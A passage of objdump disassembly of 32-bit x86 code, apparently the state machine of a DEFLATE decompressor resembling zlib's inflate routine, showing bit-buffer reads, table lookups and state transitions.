  405d3a:	83 f9 1f             	cmp    $0x1f,%ecx
  405d3d:	76 e2                	jbe    0x405d21
  405d3f:	89 f2                	mov    %esi,%edx
  405d41:	89 f0                	mov    %esi,%eax
  405d43:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  405d47:	c1 e8 18             	shr    $0x18,%eax
  405d4a:	c1 e2 18             	shl    $0x18,%edx
  405d4d:	01 c2                	add    %eax,%edx
  405d4f:	89 f0                	mov    %esi,%eax
  405d51:	c1 e8 08             	shr    $0x8,%eax
  405d54:	25 00 ff 00 00       	and    $0xff00,%eax
  405d59:	01 c2                	add    %eax,%edx
  405d5b:	89 f0                	mov    %esi,%eax
  405d5d:	8b b4 24 90 00 00 00 	mov    0x90(%esp),%esi
  405d64:	25 00 ff 00 00       	and    $0xff00,%eax
  405d69:	c1 e0 08             	shl    $0x8,%eax
  405d6c:	01 d0                	add    %edx,%eax
  405d6e:	89 43 18             	mov    %eax,0x18(%ebx)
  405d71:	89 46 30             	mov    %eax,0x30(%esi)
  405d74:	31 f6                	xor    %esi,%esi
  405d76:	c7 03 0a 00 00 00    	movl   $0xa,(%ebx)
  405d7c:	31 db                	xor    %ebx,%ebx
  405d7e:	8b 44 24 24          	mov    0x24(%esp),%eax
  405d82:	8b 48 0c             	mov    0xc(%eax),%ecx
  405d85:	85 c9                	test   %ecx,%ecx
  405d87:	0f 84 d6 1a 00 00    	je     0x407863
  405d8d:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405d94:	00 
  405d95:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405d9c:	00 
  405d9d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405da4:	e8 c7 23 00 00       	call   0x408170
  405da9:	8b 54 24 24          	mov    0x24(%esp),%edx
  405dad:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  405db4:	89 42 18             	mov    %eax,0x18(%edx)
  405db7:	89 41 30             	mov    %eax,0x30(%ecx)
  405dba:	c7 02 0b 00 00 00    	movl   $0xb,(%edx)
  405dc0:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  405dc7:	83 e8 05             	sub    $0x5,%eax
  405dca:	83 f8 01             	cmp    $0x1,%eax
  405dcd:	0f 86 2d 03 00 00    	jbe    0x406100
  405dd3:	8b 44 24 24          	mov    0x24(%esp),%eax
  405dd7:	8b 50 04             	mov    0x4(%eax),%edx
  405dda:	85 d2                	test   %edx,%edx
  405ddc:	0f 85 7e 00 00 00    	jne    0x405e60
  405de2:	83 fb 02             	cmp    $0x2,%ebx
  405de5:	77 1b                	ja     0x405e02
  405de7:	85 ff                	test   %edi,%edi
  405de9:	0f 84 64 17 00 00    	je     0x407553
  405def:	83 c5 01             	add    $0x1,%ebp
  405df2:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  405df6:	89 d9                	mov    %ebx,%ecx
  405df8:	83 ef 01             	sub    $0x1,%edi
  405dfb:	83 c3 08             	add    $0x8,%ebx
  405dfe:	d3 e0                	shl    %cl,%eax
  405e00:	01 c6                	add    %eax,%esi
  405e02:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405e06:	89 f0                	mov    %esi,%eax
  405e08:	89 f2                	mov    %esi,%edx
  405e0a:	83 e0 01             	and    $0x1,%eax
  405e0d:	d1 ea                	shr    $1,%edx
  405e0f:	89 41 04             	mov    %eax,0x4(%ecx)
  405e12:	89 d0                	mov    %edx,%eax
  405e14:	83 e0 03             	and    $0x3,%eax
  405e17:	83 f8 02             	cmp    $0x2,%eax
  405e1a:	0f 84 d2 14 00 00    	je     0x4072f2
  405e20:	83 f8 03             	cmp    $0x3,%eax
  405e23:	0f 84 e1 16 00 00    	je     0x40750a
  405e29:	83 f8 01             	cmp    $0x1,%eax
  405e2c:	0f 84 9a 16 00 00    	je     0x4074cc
  405e32:	c7 01 0d 00 00 00    	movl   $0xd,(%ecx)
  405e38:	b8 0d 00 00 00       	mov    $0xd,%eax
  405e3d:	89 d6                	mov    %edx,%esi
  405e3f:	83 eb 03             	sub    $0x3,%ebx
  405e42:	c1 ee 02             	shr    $0x2,%esi
  405e45:	e9 b6 fe ff ff       	jmp    0x405d00
  405e4a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405e50:	c7 07 0c 00 00 00    	movl   $0xc,(%edi)
  405e56:	b0 0c                	mov    $0xc,%al
  405e58:	e9 5d fe ff ff       	jmp    0x405cba
  405e5d:	8d 76 00             	lea    0x0(%esi),%esi
  405e60:	8b 44 24 24          	mov    0x24(%esp),%eax
  405e64:	89 d9                	mov    %ebx,%ecx
  405e66:	83 e3 f8             	and    $0xfffffff8,%ebx
  405e69:	83 e1 07             	and    $0x7,%ecx
  405e6c:	d3 ee                	shr    %cl,%esi
  405e6e:	c7 00 1a 00 00 00    	movl   $0x1a,(%eax)
  405e74:	b8 1a 00 00 00       	mov    $0x1a,%eax
  405e79:	e9 8b fe ff ff       	jmp    0x405d09
  405e7e:	66 90                	xchg   %ax,%ax
  405e80:	8b 44 24 24          	mov    0x24(%esp),%eax
  405e84:	8b 50 48             	mov    0x48(%eax),%edx
  405e87:	85 d2                	test   %edx,%edx
  405e89:	74 59                	je     0x405ee4
  405e8b:	39 d3                	cmp    %edx,%ebx
  405e8d:	73 30                	jae    0x405ebf
  405e8f:	85 ff                	test   %edi,%edi
  405e91:	0f 84 69 02 00 00    	je     0x406100
  405e97:	89 d9                	mov    %ebx,%ecx
  405e99:	eb 0d                	jmp    0x405ea8
  405e9b:	90                   	nop
  405e9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405ea0:	85 ff                	test   %edi,%edi
  405ea2:	0f 84 28 11 00 00    	je     0x406fd0
  405ea8:	83 c5 01             	add    $0x1,%ebp
  405eab:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  405eaf:	83 ef 01             	sub    $0x1,%edi
  405eb2:	d3 e0                	shl    %cl,%eax
  405eb4:	83 c1 08             	add    $0x8,%ecx
  405eb7:	01 c6                	add    %eax,%esi
  405eb9:	39 d1                	cmp    %edx,%ecx
  405ebb:	72 e3                	jb     0x405ea0
  405ebd:	89 cb                	mov    %ecx,%ebx
  405ebf:	89 d1                	mov    %edx,%ecx
  405ec1:	b8 01 00 00 00       	mov    $0x1,%eax
  405ec6:	29 d3                	sub    %edx,%ebx
  405ec8:	d3 e0                	shl    %cl,%eax
  405eca:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405ece:	83 e8 01             	sub    $0x1,%eax
  405ed1:	21 f0                	and    %esi,%eax
  405ed3:	01 41 44             	add    %eax,0x44(%ecx)
  405ed6:	89 d1                	mov    %edx,%ecx
  405ed8:	d3 ee                	shr    %cl,%esi
  405eda:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405ede:	01 91 c4 1b 00 00    	add    %edx,0x1bc4(%ecx)
  405ee4:	8b 44 24 24          	mov    0x24(%esp),%eax
  405ee8:	c7 00 18 00 00 00    	movl   $0x18,(%eax)
  405eee:	8b 54 24 28          	mov    0x28(%esp),%edx
  405ef2:	85 d2                	test   %edx,%edx
  405ef4:	0f 84 06 02 00 00    	je     0x406100
  405efa:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405efe:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405f02:	8b 49 44             	mov    0x44(%ecx),%ecx
  405f05:	29 d0                	sub    %edx,%eax
  405f07:	39 c8                	cmp    %ecx,%eax
  405f09:	0f 83 a5 11 00 00    	jae    0x4070b4
  405f0f:	29 c1                	sub    %eax,%ecx
  405f11:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f15:	3b 48 2c             	cmp    0x2c(%eax),%ecx
  405f18:	0f 87 36 13 00 00    	ja     0x407254
  405f1e:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f22:	8b 40 30             	mov    0x30(%eax),%eax
  405f25:	39 c1                	cmp    %eax,%ecx
  405f27:	0f 86 c3 14 00 00    	jbe    0x4073f0
  405f2d:	8b 54 24 24          	mov    0x24(%esp),%edx
  405f31:	29 c1                	sub    %eax,%ecx
  405f33:	8b 42 28             	mov    0x28(%edx),%eax
  405f36:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  405f3a:	29 c8                	sub    %ecx,%eax
  405f3c:	03 42 34             	add    0x34(%edx),%eax
  405f3f:	89 44 24 40          	mov    %eax,0x40(%esp)
  405f43:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f47:	8b 50 40             	mov    0x40(%eax),%edx
  405f4a:	39 d1                	cmp    %edx,%ecx
  405f4c:	0f 47 ca             	cmova  %edx,%ecx
  405f4f:	e9 73 11 00 00       	jmp    0x4070c7
  405f54:	83 bc 24 94 00 00 00 	cmpl   $0x6,0x94(%esp)
  405f5b:	06 
  405f5c:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f60:	c7 00 13 00 00 00    	movl   $0x13,(%eax)
  405f66:	0f 84 94 01 00 00    	je     0x406100
  405f6c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405f70:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f74:	c7 00 14 00 00 00    	movl   $0x14,(%eax)
  405f7a:	83 ff 05             	cmp    $0x5,%edi
  405f7d:	76 0e                	jbe    0x405f8d
  405f7f:	81 7c 24 28 01 01 00 	cmpl   $0x101,0x28(%esp)
  405f86:	00 
  405f87:	0f 87 a7 11 00 00    	ja     0x407134
  405f8d:	8b 44 24 24          	mov    0x24(%esp),%eax
  405f91:	8b 48 4c             	mov    0x4c(%eax),%ecx
  405f94:	c7 80 c4 1b 00 00 00 	movl   $0x0,0x1bc4(%eax)
  405f9b:	00 00 00 
  405f9e:	89 ca                	mov    %ecx,%edx
  405fa0:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  405fa4:	8b 48 54             	mov    0x54(%eax),%ecx
  405fa7:	b8 01 00 00 00       	mov    $0x1,%eax
  405fac:	d3 e0                	shl    %cl,%eax
  405fae:	83 e8 01             	sub    $0x1,%eax
  405fb1:	89 44 24 48          	mov    %eax,0x48(%esp)
  405fb5:	21 f0                	and    %esi,%eax
  405fb7:	8d 04 82             	lea    (%edx,%eax,4),%eax
  405fba:	0f b6 10             	movzbl (%eax),%edx
  405fbd:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  405fc1:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  405fc5:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  405fc9:	66 89 44 24 54       	mov    %ax,0x54(%esp)
  405fce:	0f b6 c2             	movzbl %dl,%eax
  405fd1:	39 c3                	cmp    %eax,%ebx
  405fd3:	89 44 24 44          	mov    %eax,0x44(%esp)
  405fd7:	73 62                	jae    0x40603b
  405fd9:	85 ff                	test   %edi,%edi
  405fdb:	0f 84 1f 01 00 00    	je     0x406100
  405fe1:	89 d9                	mov    %ebx,%ecx
  405fe3:	89 f3                	mov    %esi,%ebx
  405fe5:	89 fe                	mov    %edi,%esi
  405fe7:	eb 0f                	jmp    0x405ff8
  405fe9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405ff0:	85 f6                	test   %esi,%esi
  405ff2:	0f 84 2b 13 00 00    	je     0x407323
  405ff8:	83 c5 01             	add    $0x1,%ebp
  405ffb:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  405fff:	8b 54 24 40          	mov    0x40(%esp),%edx
  406003:	83 ee 01             	sub    $0x1,%esi
  406006:	d3 e0                	shl    %cl,%eax
  406008:	83 c1 08             	add    $0x8,%ecx
  40600b:	01 c3                	add    %eax,%ebx
  40600d:	8b 44 24 48          	mov    0x48(%esp),%eax
  406011:	21 d8                	and    %ebx,%eax
  406013:	8d 04 82             	lea    (%edx,%eax,4),%eax
  406016:	0f b6 10             	movzbl (%eax),%edx
  406019:	0f b7 78 02          	movzwl 0x2(%eax),%edi
  40601d:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  406021:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406025:	0f b6 c2             	movzbl %dl,%eax
  406028:	39 c8                	cmp    %ecx,%eax
  40602a:	89 44 24 44          	mov    %eax,0x44(%esp)
  40602e:	77 c0                	ja     0x405ff0
  406030:	66 89 7c 24 54       	mov    %di,0x54(%esp)
  406035:	89 f7                	mov    %esi,%edi
  406037:	89 de                	mov    %ebx,%esi
  406039:	89 cb                	mov    %ecx,%ebx
  40603b:	80 7c 24 3c 00       	cmpb   $0x0,0x3c(%esp)
  406040:	0f 84 2a 13 00 00    	je     0x407370
  406046:	f6 44 24 3c f0       	testb  $0xf0,0x3c(%esp)
  40604b:	0f 85 1f 13 00 00    	jne    0x407370
  406051:	0f b7 4c 24 54       	movzwl 0x54(%esp),%ecx
  406056:	89 44 24 48          	mov    %eax,0x48(%esp)
  40605a:	b8 01 00 00 00       	mov    $0x1,%eax
  40605f:	89 4c 24 58          	mov    %ecx,0x58(%esp)
  406063:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  406068:	02 4c 24 48          	add    0x48(%esp),%cl
  40606c:	d3 e0                	shl    %cl,%eax
  40606e:	89 d1                	mov    %edx,%ecx
  406070:	8b 54 24 40          	mov    0x40(%esp),%edx
  406074:	83 e8 01             	sub    $0x1,%eax
  406077:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  40607b:	21 f0                	and    %esi,%eax
  40607d:	d3 e8                	shr    %cl,%eax
  40607f:	03 44 24 58          	add    0x58(%esp),%eax
  406083:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  406087:	8d 04 82             	lea    (%edx,%eax,4),%eax
  40608a:	0f b6 10             	movzbl (%eax),%edx
  40608d:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  406091:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  406095:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  406099:	66 89 54 24 54       	mov    %dx,0x54(%esp)
  40609e:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  4060a1:	39 d3                	cmp    %edx,%ebx
  4060a3:	72 53                	jb     0x4060f8
  4060a5:	e9 35 16 00 00       	jmp    0x4076df
  4060aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4060b0:	83 c5 01             	add    $0x1,%ebp
  4060b3:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4060b7:	89 d9                	mov    %ebx,%ecx
  4060b9:	83 c3 08             	add    $0x8,%ebx
  4060bc:	83 ef 01             	sub    $0x1,%edi
  4060bf:	d3 e0                	shl    %cl,%eax
  4060c1:	0f b6 4c 24 48       	movzbl 0x48(%esp),%ecx
  4060c6:	01 c6                	add    %eax,%esi
  4060c8:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  4060cc:	21 f0                	and    %esi,%eax
  4060ce:	d3 e8                	shr    %cl,%eax
  4060d0:	03 44 24 58          	add    0x58(%esp),%eax
  4060d4:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4060d8:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4060db:	0f b6 10             	movzbl (%eax),%edx
  4060de:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  4060e2:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4060e6:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  4060ea:	8b 54 24 48          	mov    0x48(%esp),%edx
  4060ee:	01 c2                	add    %eax,%edx
  4060f0:	39 da                	cmp    %ebx,%edx
  4060f2:	0f 86 e2 15 00 00    	jbe    0x4076da
  4060f8:	85 ff                	test   %edi,%edi
  4060fa:	75 b4                	jne    0x4060b0
  4060fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406100:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  406104:	89 de                	mov    %ebx,%esi
  406106:	89 eb                	mov    %ebp,%ebx
  406108:	89 fd                	mov    %edi,%ebp
  40610a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40610e:	e9 3d 02 00 00       	jmp    0x406350
  406113:	8b 44 24 24          	mov    0x24(%esp),%eax
  406117:	8b 50 48             	mov    0x48(%eax),%edx
  40611a:	85 d2                	test   %edx,%edx
  40611c:	0f 85 9e 10 00 00    	jne    0x4071c0
  406122:	8b 44 24 24          	mov    0x24(%esp),%eax
  406126:	8b 40 40             	mov    0x40(%eax),%eax
  406129:	8b 54 24 24          	mov    0x24(%esp),%edx
  40612d:	89 82 c8 1b 00 00    	mov    %eax,0x1bc8(%edx)
  406133:	c7 02 16 00 00 00    	movl   $0x16,(%edx)
  406139:	8b 44 24 24          	mov    0x24(%esp),%eax
  40613d:	8b 48 58             	mov    0x58(%eax),%ecx
  406140:	8b 50 50             	mov    0x50(%eax),%edx
  406143:	b8 01 00 00 00       	mov    $0x1,%eax
  406148:	d3 e0                	shl    %cl,%eax
  40614a:	89 54 24 40          	mov    %edx,0x40(%esp)
  40614e:	83 e8 01             	sub    $0x1,%eax
  406151:	89 44 24 48          	mov    %eax,0x48(%esp)
  406155:	21 f0                	and    %esi,%eax
  406157:	8d 04 82             	lea    (%edx,%eax,4),%eax
  40615a:	0f b6 10             	movzbl (%eax),%edx
  40615d:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  406161:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406165:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406169:	66 89 44 24 54       	mov    %ax,0x54(%esp)
  40616e:	0f b6 c2             	movzbl %dl,%eax
  406171:	39 c3                	cmp    %eax,%ebx
  406173:	89 44 24 44          	mov    %eax,0x44(%esp)
  406177:	73 57                	jae    0x4061d0
  406179:	85 ff                	test   %edi,%edi
  40617b:	74 83                	je     0x406100
  40617d:	89 d9                	mov    %ebx,%ecx
  40617f:	89 fb                	mov    %edi,%ebx
  406181:	89 ef                	mov    %ebp,%edi
  406183:	eb 08                	jmp    0x40618d
  406185:	85 db                	test   %ebx,%ebx
  406187:	0f 84 83 11 00 00    	je     0x407310
  40618d:	83 c7 01             	add    $0x1,%edi
  406190:	0f b6 47 ff          	movzbl -0x1(%edi),%eax
  406194:	8b 54 24 40          	mov    0x40(%esp),%edx
  406198:	83 eb 01             	sub    $0x1,%ebx
  40619b:	d3 e0                	shl    %cl,%eax
  40619d:	83 c1 08             	add    $0x8,%ecx
  4061a0:	01 c6                	add    %eax,%esi
  4061a2:	8b 44 24 48          	mov    0x48(%esp),%eax
  4061a6:	21 f0                	and    %esi,%eax
  4061a8:	8d 04 82             	lea    (%edx,%eax,4),%eax
  4061ab:	0f b6 10             	movzbl (%eax),%edx
  4061ae:	0f b7 68 02          	movzwl 0x2(%eax),%ebp
  4061b2:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  4061b6:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  4061ba:	0f b6 c2             	movzbl %dl,%eax
  4061bd:	39 c8                	cmp    %ecx,%eax
  4061bf:	89 44 24 44          	mov    %eax,0x44(%esp)
  4061c3:	77 c0                	ja     0x406185
  4061c5:	66 89 6c 24 54       	mov    %bp,0x54(%esp)
  4061ca:	89 fd                	mov    %edi,%ebp
  4061cc:	89 df                	mov    %ebx,%edi
  4061ce:	89 cb                	mov    %ecx,%ebx
  4061d0:	f6 44 24 3c f0       	testb  $0xf0,0x3c(%esp)
  4061d5:	0f 85 a9 10 00 00    	jne    0x407284
  4061db:	0f b7 4c 24 54       	movzwl 0x54(%esp),%ecx
  4061e0:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  4061e4:	b8 01 00 00 00       	mov    $0x1,%eax
  4061e9:	89 4c 24 48          	mov    %ecx,0x48(%esp)
  4061ed:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  4061f2:	02 4c 24 5c          	add    0x5c(%esp),%cl
  4061f6:	d3 e0                	shl    %cl,%eax
  4061f8:	89 d1                	mov    %edx,%ecx
  4061fa:	8b 54 24 40          	mov    0x40(%esp),%edx
  4061fe:	83 e8 01             	sub    $0x1,%eax
  406201:	89 44 24 58          	mov    %eax,0x58(%esp)
  406205:	21 f0                	and    %esi,%eax
  406207:	d3 e8                	shr    %cl,%eax
  406209:	03 44 24 48          	add    0x48(%esp),%eax
  40620d:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  406211:	8d 04 82             	lea    (%edx,%eax,4),%eax
  406214:	0f b6 10             	movzbl (%eax),%edx
  406217:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  40621b:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  40621f:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  406223:	66 89 54 24 54       	mov    %dx,0x54(%esp)
  406228:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  40622b:	39 d3                	cmp    %edx,%ebx
  40622d:	73 65                	jae    0x406294
  40622f:	85 ff                	test   %edi,%edi
  406231:	0f 84 c9 fe ff ff    	je     0x406100
  406237:	89 f0                	mov    %esi,%eax
  406239:	8b 54 24 5c          	mov    0x5c(%esp),%edx
  40623d:	89 fe                	mov    %edi,%esi
  40623f:	89 c7                	mov    %eax,%edi
  406241:	eb 08                	jmp    0x40624b
  406243:	85 f6                	test   %esi,%esi
  406245:	0f 84 4a 12 00 00    	je     0x407495
  40624b:	83 c5 01             	add    $0x1,%ebp
  40624e:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406252:	89 d9                	mov    %ebx,%ecx
  406254:	83 c3 08             	add    $0x8,%ebx
  406257:	83 ee 01             	sub    $0x1,%esi
  40625a:	d3 e0                	shl    %cl,%eax
  40625c:	89 d1                	mov    %edx,%ecx
  40625e:	01 c7                	add    %eax,%edi
  406260:	8b 44 24 58          	mov    0x58(%esp),%eax
  406264:	21 f8                	and    %edi,%eax
  406266:	d3 e8                	shr    %cl,%eax
  406268:	03 44 24 48          	add    0x48(%esp),%eax
  40626c:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  406270:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406273:	0f b6 08             	movzbl (%eax),%ecx
  406276:	88 4c 24 3c          	mov    %cl,0x3c(%esp)
  40627a:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  40627e:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  406282:	66 89 4c 24 54       	mov    %cx,0x54(%esp)
  406287:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  40628a:	39 d9                	cmp    %ebx,%ecx
  40628c:	77 b5                	ja     0x406243
  40628e:	89 fa                	mov    %edi,%edx
  406290:	89 f7                	mov    %esi,%edi
  406292:	89 d6                	mov    %edx,%esi
  406294:	8b 54 24 5c          	mov    0x5c(%esp),%edx
  406298:	2b 5c 24 44          	sub    0x44(%esp),%ebx
  40629c:	89 d1                	mov    %edx,%ecx
  40629e:	d3 ee                	shr    %cl,%esi
  4062a0:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4062a4:	03 91 c4 1b 00 00    	add    0x1bc4(%ecx),%edx
  4062aa:	e9 df 0f 00 00       	jmp    0x40728e
  4062af:	90                   	nop
  4062b0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4062b4:	8b 50 10             	mov    0x10(%eax),%edx
  4062b7:	f6 c6 04             	test   $0x4,%dh
  4062ba:	0f 84 30 08 00 00    	je     0x406af0
  4062c0:	83 fb 0f             	cmp    $0xf,%ebx
  4062c3:	77 2a                	ja     0x4062ef
  4062c5:	85 ff                	test   %edi,%edi
  4062c7:	0f 84 33 fe ff ff    	je     0x406100
  4062cd:	89 d9                	mov    %ebx,%ecx
  4062cf:	eb 08                	jmp    0x4062d9
  4062d1:	85 ff                	test   %edi,%edi
  4062d3:	0f 84 f7 0c 00 00    	je     0x406fd0
  4062d9:	83 c5 01             	add    $0x1,%ebp
  4062dc:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4062e0:	83 ef 01             	sub    $0x1,%edi
  4062e3:	d3 e0                	shl    %cl,%eax
  4062e5:	83 c1 08             	add    $0x8,%ecx
  4062e8:	01 c6                	add    %eax,%esi
  4062ea:	83 f9 0f             	cmp    $0xf,%ecx
  4062ed:	76 e2                	jbe    0x4062d1
  4062ef:	8b 44 24 24          	mov    0x24(%esp),%eax
  4062f3:	89 70 40             	mov    %esi,0x40(%eax)
  4062f6:	8b 40 20             	mov    0x20(%eax),%eax
  4062f9:	85 c0                	test   %eax,%eax
  4062fb:	74 03                	je     0x406300
  4062fd:	89 70 14             	mov    %esi,0x14(%eax)
  406300:	f6 c6 02             	test   $0x2,%dh
  406303:	0f 85 22 13 00 00    	jne    0x40762b
  406309:	31 db                	xor    %ebx,%ebx
  40630b:	31 f6                	xor    %esi,%esi
  40630d:	8b 44 24 24          	mov    0x24(%esp),%eax
  406311:	c7 00 05 00 00 00    	movl   $0x5,(%eax)
  406317:	e9 9b 05 00 00       	jmp    0x4068b7
  40631c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406320:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  406325:	83 c4 7c             	add    $0x7c,%esp
  406328:	5b                   	pop    %ebx
  406329:	5e                   	pop    %esi
  40632a:	5f                   	pop    %edi
  40632b:	5d                   	pop    %ebp
  40632c:	c3                   	ret
  40632d:	8d 76 00             	lea    0x0(%esi),%esi
  406330:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  406334:	89 de                	mov    %ebx,%esi
  406336:	89 eb                	mov    %ebp,%ebx
  406338:	89 fd                	mov    %edi,%ebp
  40633a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40633e:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  406345:	00 
  406346:	8d 76 00             	lea    0x0(%esi),%esi
  406349:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  406350:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406357:	8b 54 24 30          	mov    0x30(%esp),%edx
  40635b:	89 50 0c             	mov    %edx,0xc(%eax)
  40635e:	89 c2                	mov    %eax,%edx
  406360:	8b 44 24 28          	mov    0x28(%esp),%eax
  406364:	89 1a                	mov    %ebx,(%edx)
  406366:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  40636a:	89 6a 04             	mov    %ebp,0x4(%edx)
  40636d:	89 42 10             	mov    %eax,0x10(%edx)
  406370:	89 77 3c             	mov    %esi,0x3c(%edi)
  406373:	89 5f 38             	mov    %ebx,0x38(%edi)
  406376:	8b 5f 28             	mov    0x28(%edi),%ebx
  406379:	85 db                	test   %ebx,%ebx
  40637b:	75 23                	jne    0x4063a0
  40637d:	39 44 24 2c          	cmp    %eax,0x2c(%esp)
  406381:	74 3d                	je     0x4063c0
  406383:	8b 07                	mov    (%edi),%eax
  406385:	83 f8 1c             	cmp    $0x1c,%eax
  406388:	77 36                	ja     0x4063c0
  40638a:	83 bc 24 94 00 00 00 	cmpl   $0x4,0x94(%esp)
  406391:	04 
  406392:	75 0c                	jne    0x4063a0
  406394:	83 f8 19             	cmp    $0x19,%eax
  406397:	77 27                	ja     0x4063c0
  406399:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4063a0:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4063a4:	2b 4c 24 28          	sub    0x28(%esp),%ecx
  4063a8:	8b 54 24 30          	mov    0x30(%esp),%edx
  4063ac:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4063b3:	e8 48 f4 ff ff       	call   0x405800
  4063b8:	85 c0                	test   %eax,%eax
  4063ba:	0f 85 8c 10 00 00    	jne    0x40744c
  4063c0:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4063c7:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  4063cb:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  4063cf:	2b 70 10             	sub    0x10(%eax),%esi
  4063d2:	2b 58 04             	sub    0x4(%eax),%ebx
  4063d5:	01 58 08             	add    %ebx,0x8(%eax)
  4063d8:	01 70 14             	add    %esi,0x14(%eax)
  4063db:	01 77 1c             	add    %esi,0x1c(%edi)
  4063de:	85 f6                	test   %esi,%esi
  4063e0:	74 3b                	je     0x40641d
  4063e2:	8b 4f 08             	mov    0x8(%edi),%ecx
  4063e5:	85 c9                	test   %ecx,%ecx
  4063e7:	74 34                	je     0x40641d
  4063e9:	8b 57 10             	mov    0x10(%edi),%edx
  4063ec:	89 74 24 08          	mov    %esi,0x8(%esp)
  4063f0:	85 d2                	test   %edx,%edx
  4063f2:	0f 84 78 0c 00 00    	je     0x407070
  4063f8:	8b 40 0c             	mov    0xc(%eax),%eax
  4063fb:	89 44 24 24          	mov    %eax,0x24(%esp)
  4063ff:	29 f0                	sub    %esi,%eax
  406401:	89 44 24 04          	mov    %eax,0x4(%esp)
  406405:	8b 47 18             	mov    0x18(%edi),%eax
  406408:	89 04 24             	mov    %eax,(%esp)
  40640b:	e8 b0 22 00 00       	call   0x4086c0
  406410:	8b 94 24 90 00 00 00 	mov    0x90(%esp),%edx
  406417:	89 47 18             	mov    %eax,0x18(%edi)
  40641a:	89 42 30             	mov    %eax,0x30(%edx)
  40641d:	83 7f 04 01          	cmpl   $0x1,0x4(%edi)
  406421:	8b 17                	mov    (%edi),%edx
  406423:	19 c0                	sbb    %eax,%eax
  406425:	f7 d0                	not    %eax
  406427:	83 e0 40             	and    $0x40,%eax
  40642a:	03 47 3c             	add    0x3c(%edi),%eax
  40642d:	83 fa 0b             	cmp    $0xb,%edx
  406430:	0f 84 ad 0b 00 00    	je     0x406fe3
  406436:	83 fa 0e             	cmp    $0xe,%edx
  406439:	0f 84 81 0b 00 00    	je     0x406fc0
  40643f:	83 fa 13             	cmp    $0x13,%edx
  406442:	0f 84 78 0b 00 00    	je     0x406fc0
  406448:	31 d2                	xor    %edx,%edx
